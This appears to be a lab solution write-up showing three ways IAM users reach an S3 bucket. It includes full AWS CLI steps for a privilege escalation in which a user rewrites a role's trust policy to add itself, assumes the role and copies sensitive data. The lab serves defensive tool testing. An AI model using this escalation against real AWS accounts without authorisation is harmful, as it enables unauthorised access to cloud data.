# Solution: Direct and Indirect Bucket Access via Multiple Reachability Paths

This scenario is a stress test for the single most important question a graph-based security tool or CSPM platform can be asked about a sensitive resource: "Who can access this?" It is tempting to answer that question by scanning IAM policies attached directly to the resource and calling it done. That answer is always incomplete. Real AWS environments are full of indirect paths -- a user who cannot touch a bucket directly but can assume a role that can, and worse, a user who cannot touch a bucket directly and cannot *currently* assume the role that can, but holds exactly the permission needed to change that.

This lab builds three parallel, independent paths to the same S3 bucket so you can verify, empirically, whether a tool's reachability analysis is complete. Two of the three paths are "normal" IAM patterns you'd find in almost any production account. The third is the one that trips up naive tooling: a trust policy that looks like a dead end today, but isn't, because the user on the other side of it has the power to rewrite it.

## The Challenge

You start with credentials for three independent IAM users, each demonstrating a different way to reach the same bucket:

- `pl-prod-dimp-user-direct` -- has a direct IAM policy granting `s3:GetObject`, `s3:PutObject`, and `s3:ListBucket` on the target bucket.
- `pl-prod-dimp-user-assumer` -- has no bucket permissions of its own, but holds `sts:AssumeRole` on `pl-prod-dimp-role-trusted`, a role that already trusts it and already has bucket access.
- `pl-prod-dimp-user-trustbypass` -- has no bucket permissions of its own, and cannot yet assume `pl-prod-dimp-role-untrusted` because that role's trust policy currently names only `ec2.amazonaws.com`. But this user holds `iam:UpdateAssumeRolePolicy` on that same role, which means the "cannot assume it" state is temporary and self-inflicted.

Your goal is to demonstrate that all three users can reach the `pl-dimp-bucket-{account_id}-{suffix}` bucket, and to confirm that a security tool asked "who has access to this bucket" surfaces all three at once -- including the one whose access requires an active escalation step to become real.

## Reconnaissance

Start by confirming the account and identity for each user in turn. Using the direct-access user's credentials:

```bash
export AWS_ACCESS_KEY_ID="<user-direct_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<user-direct_secret_access_key>"
unset AWS_SESSION_TOKEN

aws sts get-caller-identity --query 'Arn' --output text
# Expected: arn:aws:iam::{account_id}:user/pl-prod-dimp-user-direct
```

Do the same for the assumer and trust-bypass users to confirm their identities. None of them have `s3:ListAllMyBuckets`, so you won't be able to browse for the target bucket blindly -- you already know its name from the Terraform outputs, which mirrors how a real engagement would surface it (from a config file, a README, a previous recon step, or the tool itself flagging it as sensitive).

The interesting recon here isn't about the bucket -- it's about the two roles. Before touching either one, look at what each user is actually allowed to do:

```bash
aws iam list-attached-user-policies --user-name pl-prod-dimp-user-assumer
aws iam list-attached-user-policies --user-name pl-prod-dimp-user-trustbypass
```

The assumer user's policy grants only `sts:AssumeRole` on `pl-prod-dimp-role-trusted`. The trust-bypass user's policy grants both `sts:AssumeRole` *and* `iam:UpdateAssumeRolePolicy` on `pl-prod-dimp-role-untrusted`. That second permission is the whole story of this scenario -- keep it in mind as you move to exploitation.

## Exploitation

### Path 1: Direct Access

With the direct-access user's credentials active, there's nothing to escalate. List and read the bucket immediately:

```bash
aws s3 ls "s3://pl-dimp-bucket-{account_id}-{suffix}/"
aws s3 cp "s3://pl-dimp-bucket-{account_id}-{suffix}/sensitive-data.txt" /tmp/dimp-direct.txt
cat /tmp/dimp-direct.txt
```

This succeeds because the user's own IAM policy grants `s3:GetObject`, `s3:PutObject`, and `s3:ListBucket` on the bucket directly. This is the path every tool catches -- it's the baseline.

### Path 2: Indirect Access, No Escalation Needed

Switch to the assumer user's credentials and confirm it has no direct bucket access:

```bash
export AWS_ACCESS_KEY_ID="<user-assumer_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<user-assumer_secret_access_key>"
unset AWS_SESSION_TOKEN

aws s3 ls "s3://pl-dimp-bucket-{account_id}-{suffix}/"
# Expected: An error occurred (AccessDenied)
```

Now assume `pl-prod-dimp-role-trusted`. Its trust policy already lists this user as a trusted principal -- there's no obstacle to clear:

```bash
CREDENTIALS=$(aws sts assume-role \
    --role-arn "arn:aws:iam::{account_id}:role/pl-prod-dimp-role-trusted" \
    --role-session-name dimp-assumer \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')

aws s3 ls "s3://pl-dimp-bucket-{account_id}-{suffix}/"
aws s3 cp "s3://pl-dimp-bucket-{account_id}-{suffix}/sensitive-data.txt" /tmp/dimp-trusted-role.txt
```

This is the classic "indirect access" pattern most graph tools already handle: trace the `sts:AssumeRole` edge, follow it to the role, union the role's permissions onto the user. Nothing here requires the user to take any action beyond assuming the role -- the access was already live before you started.

### Path 3: Indirect Access, Escalation Required

This is the path that separates thorough tools from superficial ones. Switch to the trust-bypass user and try the same move that just worked for the assumer user:

```bash
export AWS_ACCESS_KEY_ID="<user-trustbypass_access_key_id>"
export AWS_SECRET_ACCESS_KEY="<user-trustbypass_secret_access_key>"
unset AWS_SESSION_TOKEN

aws sts assume-role \
    --role-arn "arn:aws:iam::{account_id}:role/pl-prod-dimp-role-untrusted" \
    --role-session-name dimp-trustbypass \
    --query 'Credentials' \
    --output json
# Expected: AccessDenied -- the role's trust policy does not currently name this user
```

This fails, and if you stopped here, you'd conclude -- incorrectly -- that this user has no path to the bucket. But this user's IAM policy also grants `iam:UpdateAssumeRolePolicy` on the exact role that just rejected it. Fetch the role's current trust policy, add this user as a trusted principal, and push the update:

```bash
aws iam get-role --role-name pl-prod-dimp-role-untrusted \
    --query 'Role.AssumeRolePolicyDocument' > current-trust-policy.json

# Edit current-trust-policy.json to add:
# {"Effect": "Allow", "Principal": {"AWS": "arn:aws:iam::{account_id}:user/pl-prod-dimp-user-trustbypass"}, "Action": "sts:AssumeRole"}
# to the existing Statement array, alongside the existing ec2.amazonaws.com trust entry.

aws iam update-assume-role-policy \
    --role-name pl-prod-dimp-role-untrusted \
    --policy-document file://updated-trust-policy.json
```

IAM trust policy changes need a short window to propagate. Wait roughly 15 seconds, then retry the assumption:

```bash
sleep 15

CREDENTIALS=$(aws sts assume-role \
    --role-arn "arn:aws:iam::{account_id}:role/pl-prod-dimp-role-untrusted" \
    --role-session-name dimp-trustbypass \
    --query 'Credentials' \
    --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')

aws s3 ls "s3://pl-dimp-bucket-{account_id}-{suffix}/"
aws s3 cp "s3://pl-dimp-bucket-{account_id}-{suffix}/sensitive-data.txt" /tmp/dimp-untrusted-role.txt
```

This now succeeds. The user did not have this access when the scenario started -- it created its own access by exercising a permission most people think of as an administrative housekeeping action, not a privilege escalation primitive.

## Verification

All three paths are now confirmed:

1. `pl-prod-dimp-user-direct` accessed the bucket immediately via a direct IAM policy grant.
2. `pl-prod-dimp-user-assumer` accessed the bucket by assuming `pl-prod-dimp-role-trusted`, whose trust policy already permitted it -- no escalation, purely a graph traversal.
3. `pl-prod-dimp-user-trustbypass` accessed the bucket only after actively rewriting `pl-prod-dimp-role-untrusted`'s trust policy to add itself, then assuming the newly-trusting role -- a genuine privilege escalation.

The definitive test is to ask your security tool: "Who can access `pl-dimp-bucket-{account_id}-{suffix}`?" A complete answer must include all of the following:

```
- arn:aws:iam::{account_id}:user/pl-prod-dimp-user-direct       (direct access)
- arn:aws:iam::{account_id}:user/pl-prod-dimp-user-assumer      (indirect, no escalation needed)
- arn:aws:iam::{account_id}:role/pl-prod-dimp-role-trusted      (direct access)
- arn:aws:iam::{account_id}:user/pl-prod-dimp-user-trustbypass  (indirect, requires trust-policy escalation)
- arn:aws:iam::{account_id}:role/pl-prod-dimp-role-untrusted    (direct access)
```

If your tool returns only the direct-access user and the assumer user, it is treating IAM trust policies as static facts rather than as identity-based permissions that can themselves be rewritten by a sufficiently privileged caller -- and it is silently under-reporting the true blast radius of this bucket.

## What Happened

This scenario isolates two categories of "indirect access" that are frequently conflated but behave very differently from a detection standpoint. The assumer user's path is a pure graph traversal problem: follow the `sts:AssumeRole` edge to a role, union its permissions in. Most mature IAM analysis tools get this right, because the trust relationship is already true at the time of the query.

The trust-bypass user's path is fundamentally different: it is a *reachability-over-time* problem. At the moment you query the environment, the trust policy on `pl-prod-dimp-role-untrusted` says "no" to this user. But the user's own IAM policy contains the means to make the trust policy say "yes" whenever it chooses to. A tool that treats trust policies as immutable ground truth will report this user as having no path to the bucket -- which is true only until the user decides otherwise, and by then the tool's model of the environment is already wrong.

In production accounts, this pattern shows up constantly: CI/CD service accounts with `iam:UpdateAssumeRolePolicy` scoped "just for automation," break-glass roles whose trust policies get rewritten during incidents and never rewritten back, and third-party integrations that request broad IAM management permissions for convenience. Any of these can silently become a bridge to a sensitive bucket, a secrets store, or an administrative role -- and the only way to catch it before an attacker does is to model trust policies as things that can be changed, not just things that currently exist.
